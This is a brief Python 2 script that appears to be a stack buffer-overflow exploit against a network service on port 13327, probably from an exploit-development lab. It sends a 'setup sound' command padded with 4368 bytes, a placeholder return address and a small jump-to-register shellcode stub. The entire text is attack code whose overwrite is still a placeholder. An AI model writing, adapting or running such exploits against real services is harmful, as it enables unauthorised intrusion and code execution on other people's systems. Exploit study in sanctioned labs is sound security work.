#!/usr/bin/python
import socket

target = "192.168.198.44"
port = 13327

padding = "\x41" * 4368 
eip = "\x42" * 4
first_stage = "\x83\xC0\x0C\xff\xE0\x90\x90"

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]SENDING BUFFER[*]"

s.connect((target,port))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]PAYLOAD SENT ... CLOSING[*]"